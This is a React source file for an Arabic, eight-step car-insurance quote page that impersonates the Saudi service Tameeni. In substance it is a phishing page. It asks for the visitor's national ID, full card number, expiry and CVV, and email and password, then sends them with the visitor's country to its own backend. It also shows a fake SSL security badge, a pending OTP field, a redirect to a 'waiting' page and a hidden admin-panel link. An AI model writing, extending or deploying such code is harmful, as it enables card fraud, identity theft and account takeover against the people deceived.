import { useState } from "react";
import { Menu, X, ChevronLeft, ChevronRight, Loader2, Users, Shield, Star, Plus, Minus, Check, CreditCard, Lock } from "lucide-react";
import { tameeniApi } from "@/lib/api";
import { getCountry } from "@/lib/getCountry";
import { useTracking } from "@/lib/useTracking";

const TOTAL_STEPS = 8;
const MAKES = ["تويوتا", "هوندا", "نيسان", "هيونداي", "كيا", "فورد", "شيفروليه", "لكزس", "بي إم دبليو", "مرسيدس", "أودي", "أخرى"];
const YEARS = Array.from({ length: 20 }, (_, i) => String(2024 - i));
const CITIES = ["الرياض", "جدة", "مكة المكرمة", "المدينة المنورة", "الدمام", "الخبر", "الطائف", "تبوك", "أبها", "أخرى"];

const INSURERS = [
  { id: "salama", name: "salama", arName: "سلامة", price: 352, badge: "الأفضل سعراً", badgeColor: "#16a34a", logoBg: "#00a651", logoText: "S" },
  { id: "med-gulf", name: "med-gulf", arName: "ميد غلف", price: 528, badge: "موصى به", badgeColor: "#0891b2", logoBg: "#0369a1", logoText: "MG" },
  { id: "takaful-rajhi", name: "takaful-rajhi", arName: "كافل الراجحي", price: 540, badge: null, badgeColor: null, logoBg: "#0f766e", logoText: "TR" },
  { id: "al-etihad", name: "al-etihad", arName: "الاتحاد", price: 567, badge: "خيار جيد", badgeColor: "#d97706", logoBg: "#1d4ed8", logoText: "AE" },
  { id: "buruj", name: "buruj", arName: "بروج", price: 617, badge: null, badgeColor: null, logoBg: "#7c3aed", logoText: "B" },
  { id: "tawuniya", name: "tawuniya", arName: "التعاونية", price: 623, badge: null, badgeColor: null, logoBg: "#0d6efd", logoText: "T" },
  { id: "gulf-union", name: "gulf-union", arName: "الخليج الأهلي", price: 631, badge: null, badgeColor: null, logoBg: "#1e40af", logoText: "GU" },
];

/* ---------- Reusable components ---------- */

function RadioCard({ label, desc, selected, onClick }: { label: string; desc: string; selected: boolean; onClick: () => void }) {
  return (
    <button type="button" onClick={onClick}
      className="w-full text-right rounded-2xl border-2 px-5 py-4 transition-all"
      style={{ borderColor: selected ? "#0d6efd" : "#e5e7eb", background: selected ? "#eff6ff" : "white" }}>
      <div className="font-extrabold text-[16px]" style={{ color: selected ? "#0d6efd" : "#111827" }}>{label}</div>
      <div className="text-[13px] mt-0.5" style={{ color: selected ? "#3b82f6" : "#9ca3af" }}>{desc}</div>
    </button>
  );
}

function Field({ label, value, onChange, placeholder = "", type = "text", dir = "ltr", required = true }: {
  label: string; value: string; onChange: (v: string) => void;
  placeholder?: string; type?: string; dir?: string; required?: boolean;
}) {
  return (
    <div>
      <label className="block text-[14px] font-bold text-gray-800 mb-1.5">
        {label}{required && <span className="text-red-500 mr-1">*</span>}
      </label>
      <input type={type} placeholder={placeholder} value={value} onChange={e => onChange(e.target.value)}
        dir={dir} autoComplete="off"
        className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 placeholder:text-gray-300 transition-all" />
    </div>
  );
}

function SelectField({ label, value, onChange, options, required = true }: {
  label: string; value: string; onChange: (v: string) => void; options: string[]; required?: boolean;
}) {
  return (
    <div>
      <label className="block text-[14px] font-bold text-gray-800 mb-1.5">
        {label}{required && <span className="text-red-500 mr-1">*</span>}
      </label>
      <select value={value} onChange={e => onChange(e.target.value)}
        className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 transition-all appearance-none">
        <option value="">اختر...</option>
        {options.map(o => <option key={o} value={o}>{o}</option>)}
      </select>
    </div>
  );
}

/* ---------- Main ---------- */

export default function QuotePage() {
  useTracking("استعلام عن تأمين");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  // Step 1
  const [purpose, setPurpose] = useState("تجديد وثيقة");
  const [vehicleType, setVehicleType] = useState("برقم تسلسلي");
  const [name, setName] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [vehicleSerial, setVehicleSerial] = useState("");
  const [vehiclePlate, setVehiclePlate] = useState("");

  // Step 2
  const [vehicleValue, setVehicleValue] = useState("");
  const [insuranceType, setInsuranceType] = useState("ضد الغير");
  const [driverCount, setDriverCount] = useState(0);
  const [wantsDiscount, setWantsDiscount] = useState(false);

  // Step 3
  const [priceTab, setPriceTab] = useState("ضد الغير");
  const [selectedInsurer, setSelectedInsurer] = useState("al-etihad");

  // Step 4
  const [carMake, setCarMake] = useState("");
  const [carYear, setCarYear] = useState("");

  // Step 5
  const [city, setCity] = useState("");
  const [phone, setPhone] = useState("");

  // Step 6 – Payment
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardMonth, setCardMonth] = useState("");
  const [cardYearExp, setCardYearExp] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  // Step 8
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  async function handleSubmit() {
    setLoading(true);
    const id = localStorage.getItem("tameeni_id") ?? `t-${Date.now()}`;
    localStorage.setItem("tameeni_id", id);
    const country = await getCountry();
    const carPlate = vehicleType === "برقم لوحة" ? vehiclePlate : vehicleSerial;
    await tameeniApi.submit({
      id, submittedAt: new Date().toLocaleTimeString("ar-SA"), submittedAtTs: Date.now(),
      name, phone, nationalId, email, password,
      carPlate, carYear, carMake,
      cardNumber, cardName, cardMonth, cardYearExp, cardCvv,
      otpCode: "", otpStatus: null,
      page: "استعلام عن تأمين", lastSeen: Date.now(), country,
    });
    window.location.href = "/tameeni/waiting";
  }

  const canProceed = () => {
    if (step === 1) return !!(name && nationalId && (vehicleType === "برقم تسلسلي" ? vehicleSerial : vehiclePlate));
    if (step === 2) return !!insuranceType;
    if (step === 3) return !!selectedInsurer;
    if (step === 4) return !!(carMake && carYear);
    if (step === 5) return !!(city && phone);
    if (step === 6) return !!(cardNumber && cardName && cardMonth && cardYearExp && cardCvv);
    if (step === TOTAL_STEPS) return !!(email && password);
    return true;
  };

  const handleNext = async () => {
    if (step === TOTAL_STEPS) { await handleSubmit(); }
    else { setStep(s => s + 1); }
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl" style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>

      {/* NAVBAR */}
      <nav style={{ background: "#0d1c3b" }}>
        <div className="max-w-7xl mx-auto px-4 h-[60px] flex items-center justify-between">
          <button onClick={() => setMenuOpen(!menuOpen)} className="text-white p-1.5">
            {menuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
          </button>
          <div className="flex items-center gap-3">
            <button onClick={() => setStep(s => Math.min(TOTAL_STEPS, s + 1))}
              style={{ background: "#0d6efd" }}
              className="px-5 py-2 rounded-lg text-white text-[13px] font-bold hover:opacity-90 transition-opacity">
              ابدأ الآن
            </button>
            <div className="flex items-center gap-2 mr-3 cursor-pointer" onClick={() => window.location.href = "/tameeni/"}>
              <span className="text-white text-[22px] font-black tracking-tight">تأميني</span>
              <div className="w-9 h-9 rounded-full flex items-center justify-center" style={{ background: "#00c389" }}>
                <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </nav>

      <div className="max-w-lg mx-auto px-4 py-8">
        <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-6 space-y-5">

            {/* ═══ STEP 1: البيانات الأساسية ═══ */}
            {step === 1 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">البيانات الأساسية</h2>
                  <p className="text-[14px] text-gray-500 mt-1">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
                </div>
                <div className="space-y-2.5">
                  <label className="block text-[14px] font-bold text-gray-800">الغرض من التأمين <span className="text-red-500">*</span></label>
                  <RadioCard label="تجديد وثيقة" desc="تجديد وثيقة تأمين موجودة" selected={purpose === "تجديد وثيقة"} onClick={() => setPurpose("تجديد وثيقة")} />
                  <RadioCard label="نقل ملكية" desc="تأمين مركبة منقولة الملكية" selected={purpose === "نقل ملكية"} onClick={() => setPurpose("نقل ملكية")} />
                </div>
                <Field label="اسم مالك الوثيقة" value={name} onChange={setName} placeholder="الاسم الكامل" dir="rtl" />
                <Field label="رقم هوية المالك" value={nationalId} onChange={setNationalId} placeholder="1234567890" />
                <div className="space-y-2.5">
                  <label className="block text-[14px] font-bold text-gray-800">نوع المركبة <span className="text-red-500">*</span></label>
                  <RadioCard label="مركبة برقم تسلسلي" desc="مركبة مسجلة برقم تسلسلي" selected={vehicleType === "برقم تسلسلي"} onClick={() => setVehicleType("برقم تسلسلي")} />
                  <RadioCard label="مركبة برقم لوحة" desc="مركبة مسجلة برقم لوحة" selected={vehicleType === "برقم لوحة"} onClick={() => setVehicleType("برقم لوحة")} />
                </div>
                {vehicleType === "برقم تسلسلي"
                  ? <Field label="الرقم التسلسلي للمركبة" value={vehicleSerial} onChange={setVehicleSerial} placeholder="123456789" />
                  : <Field label="رقم لوحة المركبة" value={vehiclePlate} onChange={setVehiclePlate} placeholder="أ ب ج 1234" dir="rtl" />}
              </>
            )}

            {/* ═══ STEP 2: الخيارات ═══ */}
            {step === 2 && (
              <>
                <Field label="قيمة المركبة (ريال)" value={vehicleValue} onChange={setVehicleValue} placeholder="54,715" />
                <div>
                  <label className="block text-[14px] font-bold text-gray-800 mb-2.5">نوع التأمين <span className="text-red-500">*</span></label>
                  <div className="grid grid-cols-2 gap-3">
                    {[
                      { key: "ضد الغير", label: "تأمين ضد الغير", sub: "التغطية الأساسية", icon: <Users className="w-6 h-6" /> },
                      { key: "شامل", label: "تأمين شامل", sub: "تغطية كاملة للمركبة", icon: <Shield className="w-6 h-6" /> },
                    ].map(opt => {
                      const sel = insuranceType === opt.key;
                      return (
                        <button key={opt.key} type="button" onClick={() => setInsuranceType(opt.key)}
                          className="rounded-2xl border-2 p-4 text-center transition-all"
                          style={{ borderColor: sel ? "#0d6efd" : "#e5e7eb", background: sel ? "#eff6ff" : "white" }}>
                          <div className="flex justify-center mb-2" style={{ color: sel ? "#0d6efd" : "#9ca3af" }}>{opt.icon}</div>
                          <div className="font-extrabold text-[14px]" style={{ color: sel ? "#0d6efd" : "#111827" }}>{opt.label}</div>
                          <div className="text-[12px] mt-0.5" style={{ color: sel ? "#3b82f6" : "#9ca3af" }}>{opt.sub}</div>
                        </button>
                      );
                    })}
                  </div>
                </div>
                <div className="border border-gray-200 rounded-2xl p-4">
                  <div className="flex items-center gap-2 mb-3">
                    <Users className="w-5 h-5 text-gray-600" />
                    <span className="font-extrabold text-[15px] text-gray-900">إضافة سائقين</span>
                  </div>
                  <div className="flex items-center gap-4 justify-center">
                    <button type="button" onClick={() => setDriverCount(c => Math.min(5, c + 1))}
                      className="w-9 h-9 rounded-full flex items-center justify-center text-white font-bold hover:opacity-80" style={{ background: "#0d6efd" }}>
                      <Plus className="w-4 h-4" />
                    </button>
                    <span className="text-[22px] font-black text-gray-900 w-8 text-center">{driverCount}</span>
                    <button type="button" onClick={() => setDriverCount(c => Math.max(0, c - 1))}
                      className="w-9 h-9 rounded-full flex items-center justify-center text-white font-bold hover:opacity-80" style={{ background: "#0d6efd" }}>
                      <Minus className="w-4 h-4" />
                    </button>
                  </div>
                  <p className="text-center text-[12px] text-gray-400 mt-2">الحد الأقصى 5 سائقين</p>
                </div>
                <div className="rounded-2xl p-4 space-y-3" style={{ background: "#f0fdf4", border: "1px solid #bbf7d0" }}>
                  <div className="flex items-center gap-2">
                    <Star className="w-5 h-5 text-emerald-600" />
                    <span className="font-extrabold text-[15px] text-gray-900">خصومات خاصة</span>
                  </div>
                  <label className="flex items-center gap-2.5 cursor-pointer">
                    <input type="checkbox" checked={wantsDiscount} onChange={e => setWantsDiscount(e.target.checked)} className="w-4 h-4 accent-emerald-600" />
                    <span className="text-[14px] text-gray-700 font-semibold">أريد الحصول على خصومات خاصة</span>
                  </label>
                  <button type="button" className="w-full py-2.5 rounded-xl text-white font-bold text-[14px] hover:opacity-90 transition-opacity" style={{ background: "#16a34a" }}>
                    عرض الخصومات
                  </button>
                </div>
              </>
            )}

            {/* ═══ STEP 3: قائمة الأسعار ═══ */}
            {step === 3 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">قائمة الأسعار</h2>
                  <p className="text-[14px] text-gray-500 mt-1">قارن بين العروض المتاحة واختر الأنسب لك</p>
                </div>

                {/* Tabs */}
                <div className="flex rounded-2xl overflow-hidden border border-gray-200 bg-gray-100">
                  {["ضد الغير", "شامل"].map(t => (
                    <button key={t} type="button" onClick={() => setPriceTab(t)}
                      className="flex-1 py-2.5 text-[14px] font-extrabold transition-all rounded-xl"
                      style={{
                        background: priceTab === t ? "#0d6efd" : "transparent",
                        color: priceTab === t ? "white" : "#6b7280",
                      }}>
                      {t}
                    </button>
                  ))}
                </div>

                {/* Company cards */}
                <div className="space-y-3 -mx-1">
                  {INSURERS.map(ins => {
                    const sel = selectedInsurer === ins.id;
                    return (
                      <button key={ins.id} type="button" onClick={() => setSelectedInsurer(ins.id)}
                        className="w-full text-right rounded-2xl border-2 p-4 transition-all relative overflow-hidden"
                        style={{ borderColor: sel ? "#0d6efd" : "#e5e7eb", background: sel ? "#eff6ff" : "white" }}>
                        <div className="flex items-center gap-3">
                          {/* Left: checkmark (when selected) */}
                          <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all"
                            style={{ borderColor: sel ? "#0d6efd" : "#d1d5db", background: sel ? "#0d6efd" : "transparent" }}>
                            {sel && <Check className="w-3.5 h-3.5 text-white" strokeWidth={3} />}
                          </div>

                          {/* Middle: name + price + badge */}
                          <div className="flex-1 text-right">
                            <div className="flex items-center justify-between">
                              <div className="text-right">
                                <div className="font-extrabold text-[15px] text-gray-900">{ins.name}</div>
                                <div className="flex flex-wrap gap-1.5 mt-1">
                                  <span className="inline-block bg-gray-100 text-gray-600 text-[11px] font-bold rounded-lg px-2 py-0.5">
                                    {priceTab}
                                  </span>
                                  {ins.badge && (
                                    <span className="inline-block text-[11px] font-bold rounded-lg px-2 py-0.5 text-white"
                                      style={{ background: ins.badgeColor! }}>
                                      {ins.badge}
                                    </span>
                                  )}
                                </div>
                              </div>
                              {/* Logo */}
                              <div className="w-12 h-12 rounded-xl flex items-center justify-center text-white text-[12px] font-black flex-shrink-0"
                                style={{ background: ins.logoBg }}>
                                {ins.logoText}
                              </div>
                            </div>
                            {/* Feature text */}
                            <p className="text-[12px] text-gray-500 mt-2 flex items-center gap-1">
                              <Check className="w-3.5 h-3.5 text-emerald-500 flex-shrink-0" strokeWidth={3} />
                              المسؤولية المدنية تجاه الغير بحد أق...
                            </p>
                          </div>

                          {/* Right: price */}
                          <div className="text-left flex-shrink-0 w-16">
                            <div className="font-black text-[18px] text-gray-900">{ins.price}</div>
                            <div className="text-[11px] text-gray-400 font-semibold">ر.س / سنوياً</div>
                          </div>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </>
            )}

            {/* ═══ STEP 4: بيانات المركبة ═══ */}
            {step === 4 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">بيانات المركبة</h2>
                  <p className="text-[14px] text-gray-500 mt-1">تفاصيل إضافية عن مركبتك</p>
                </div>
                <SelectField label="الشركة المصنعة" value={carMake} onChange={setCarMake} options={MAKES} />
                <SelectField label="سنة الصنع" value={carYear} onChange={setCarYear} options={YEARS} />
              </>
            )}

            {/* ═══ STEP 5: بيانات التواصل ═══ */}
            {step === 5 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">بيانات التواصل</h2>
                  <p className="text-[14px] text-gray-500 mt-1">أدخل بياناتك لإرسال وثيقة التأمين</p>
                </div>
                <SelectField label="المدينة" value={city} onChange={setCity} options={CITIES} />
                <Field label="رقم الجوال" value={phone} onChange={setPhone} placeholder="05xxxxxxxx" />
              </>
            )}

            {/* ═══ STEP 6: بيانات الدفع ═══ */}
            {step === 6 && (() => {
              const ins = INSURERS.find(i => i.id === selectedInsurer) ?? INSURERS[3];
              const base = ins.price * 0.54;
              const extras = 50;
              const tax = ins.price * 0.38;
              const total = ins.price * 1.0;
              const fmt = (n: number) => n.toFixed(2) + " ر.س";
              const MONTHS = ["01","02","03","04","05","06","07","08","09","10","11","12"];
              const EXP_YEARS = Array.from({ length: 10 }, (_, i) => String(new Date().getFullYear() + i));
              return (
                <>
                  <div>
                    <h2 className="text-[24px] font-black text-gray-900">بيانات الدفع</h2>
                    <p className="text-[14px] text-gray-500 mt-1 text-center">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
                  </div>

                  {/* Security badge */}
                  <div className="flex items-center gap-3 rounded-2xl p-4" style={{ background: "#f0fdf4", border: "1px solid #bbf7d0" }}>
                    <div className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0" style={{ background: "#16a34a" }}>
                      <Lock className="w-5 h-5 text-white" />
                    </div>
                    <div>
                      <div className="font-extrabold text-[15px] text-gray-900">دفع آمن ومحمي</div>
                      <div className="text-[12px] text-gray-500">جميع بياناتك محمية بتشفير SSL 256-bit</div>
                    </div>
                  </div>

                  {/* Card number */}
                  <div>
                    <label className="block text-[14px] font-bold text-gray-800 mb-1.5">رقم البطاقة <span className="text-red-500">*</span></label>
                    <div className="relative">
                      <input
                        type="text" inputMode="numeric" maxLength={19}
                        placeholder="#### #### #### ####"
                        value={cardNumber}
                        onChange={e => {
                          const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
                          setCardNumber(raw.replace(/(.{4})/g, "$1 ").trim());
                        }}
                        dir="ltr"
                        className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 pr-12 placeholder:text-gray-300 transition-all"
                      />
                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    </div>
                  </div>

                  {/* Cardholder name */}
                  <div>
                    <label className="block text-[14px] font-bold text-gray-800 mb-1.5">الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span></label>
                    <input
                      type="text" placeholder="الاسم الكامل" value={cardName} onChange={e => setCardName(e.target.value)}
                      dir="rtl" autoComplete="off"
                      className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 placeholder:text-gray-300 transition-all"
                    />
                  </div>

                  {/* Month / Year / CVV */}
                  <div className="grid grid-cols-3 gap-3">
                    <div>
                      <label className="block text-[13px] font-bold text-gray-800 mb-1.5">الشهر <span className="text-red-500">*</span></label>
                      <select value={cardMonth} onChange={e => setCardMonth(e.target.value)}
                        className="w-full border border-gray-200 rounded-xl px-3 py-3 text-[14px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 appearance-none">
                        <option value="">الشهر</option>
                        {MONTHS.map(m => <option key={m} value={m}>{m}</option>)}
                      </select>
                    </div>
                    <div>
                      <label className="block text-[13px] font-bold text-gray-800 mb-1.5">السنة <span className="text-red-500">*</span></label>
                      <select value={cardYearExp} onChange={e => setCardYearExp(e.target.value)}
                        className="w-full border border-gray-200 rounded-xl px-3 py-3 text-[14px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 appearance-none">
                        <option value="">السنة</option>
                        {EXP_YEARS.map(y => <option key={y} value={y}>{y}</option>)}
                      </select>
                    </div>
                    <div>
                      <label className="block text-[13px] font-bold text-gray-800 mb-1.5">CVV <span className="text-red-500">*</span></label>
                      <input
                        type="text" inputMode="numeric" maxLength={4} placeholder="123"
                        value={cardCvv} onChange={e => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                        dir="ltr"
                        className="w-full border border-gray-200 rounded-xl px-3 py-3 text-[14px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 placeholder:text-gray-300 transition-all"
                      />
                    </div>
                  </div>

                  {/* Payment summary */}
                  <div className="rounded-2xl border border-gray-200 p-5 space-y-3">
                    <h3 className="font-extrabold text-[17px] text-gray-900 text-center">ملخص الدفع</h3>
                    <div className="space-y-2">
                      {[
                        { label: "قسط التأمين", val: fmt(base) },
                        { label: "الإضافات", val: fmt(extras) },
                        { label: "الرسوم والضرائب", val: fmt(tax) },
                      ].map(row => (
                        <div key={row.label} className="flex justify-between items-center">
                          <span className="text-[14px] text-gray-600">{row.label}</span>
                          <span className="text-[14px] font-semibold text-gray-900 dir-ltr">{row.val}</span>
                        </div>
                      ))}
                      <div className="border-t border-gray-200 pt-2 flex justify-between items-center">
                        <span className="font-extrabold text-[16px] text-gray-900">المجموع</span>
                        <span className="font-black text-[18px]" style={{ color: "#16a34a" }}>{fmt(total)}</span>
                      </div>
                    </div>
                  </div>
                </>
              );
            })()}

            {/* ═══ STEP 7: تفاصيل التغطية ═══ */}
            {step === 7 && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">تفاصيل التغطية</h2>
                  <p className="text-[14px] text-gray-500 mt-1">اختر مستوى التغطية المطلوبة</p>
                </div>
                <div className="space-y-3">
                  {[
                    { label: "حد المسؤولية المدنية", opts: ["10,000,000 ر.س", "20,000,000 ر.س"] },
                    { label: "تغطية إضافية", opts: ["بدون تغطية إضافية", "مساعدة على الطريق"] },
                  ].map(f => (
                    <div key={f.label} className="space-y-2">
                      <label className="block text-[14px] font-bold text-gray-800">{f.label} <span className="text-red-500">*</span></label>
                      {f.opts.map((o, i) => (
                        <button key={o} type="button"
                          className="w-full text-right rounded-2xl border-2 px-5 py-3.5 transition-all"
                          style={{ borderColor: i === 0 ? "#0d6efd" : "#e5e7eb", background: i === 0 ? "#eff6ff" : "white" }}>
                          <span className="font-extrabold text-[15px]" style={{ color: i === 0 ? "#0d6efd" : "#111827" }}>{o}</span>
                        </button>
                      ))}
                    </div>
                  ))}
                </div>
              </>
            )}

            {/* ═══ STEP 8: تسجيل الدخول ═══ */}
            {step === TOTAL_STEPS && (
              <>
                <div>
                  <h2 className="text-[24px] font-black text-gray-900">تسجيل الدخول</h2>
                  <p className="text-[14px] text-gray-500 mt-1">أدخل بيانات حسابك لإتمام طلب التأمين</p>
                </div>
                <Field label="البريد الإلكتروني" value={email} onChange={setEmail} placeholder="example@email.com" type="email" />
                <Field label="كلمة المرور" value={password} onChange={setPassword} placeholder="••••••••" type="text" />
                <p className="text-center text-[12px] text-gray-400">
                  بالمتابعة توافق على <a href="#" className="text-blue-600 hover:underline">الشروط والأحكام</a>
                </p>
              </>
            )}

          </div>

          {/* ═══ BOTTOM NAV ═══ */}
          <div className="px-6 pb-6 space-y-4">
            <div className="flex justify-center">
              <span className="inline-block bg-gray-100 text-gray-500 text-[13px] font-semibold rounded-full px-4 py-1.5">
                الخطوة {step} من {TOTAL_STEPS}
              </span>
            </div>
            <div className="flex gap-3">
              <button onClick={() => setStep(s => Math.max(1, s - 1))} disabled={step === 1}
                className="flex items-center gap-1.5 px-5 py-3 rounded-xl border border-gray-200 text-gray-600 text-[14px] font-bold hover:bg-gray-50 disabled:opacity-30 transition-colors">
                <ChevronRight className="w-4 h-4" />
                السابق
              </button>
              <button onClick={handleNext} disabled={!canProceed() || loading}
                className="flex-1 flex items-center justify-center gap-1.5 py-3 rounded-xl text-white text-[15px] font-extrabold disabled:opacity-40 transition-colors"
                style={{ background: step === 6 ? "#16a34a" : "#0d6efd" }}>
                {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : (
                  <>
                    {step === TOTAL_STEPS ? "إصدار وثيقة التأمين" : step === 6 ? (<><CreditCard className="w-4 h-4" />تأكيد الدفع</>) : (<>التالي<ChevronLeft className="w-4 h-4" /></>)}
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* WhatsApp chat */}
      <a href="#" className="fixed bottom-6 left-6 w-14 h-14 rounded-full flex items-center justify-center shadow-xl hover:scale-105 transition-transform" style={{ background: "#25d366" }}>
        <svg className="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24">
          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
          <path d="M12 0C5.373 0 0 5.373 0 12c0 2.106.549 4.09 1.51 5.815L.057 23.454a.5.5 0 00.631.614l5.801-1.527A11.943 11.943 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 22a9.94 9.94 0 01-5.073-1.387l-.362-.215-3.762.99.999-3.673-.235-.374A9.96 9.96 0 012 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10z"/>
        </svg>
      </a>

      <a href="/tameeni/admin" className="fixed bottom-4 right-4 text-[10px] text-gray-300 opacity-20 hover:opacity-100 transition-all">لوحة التحكم</a>
    </div>
  );
}
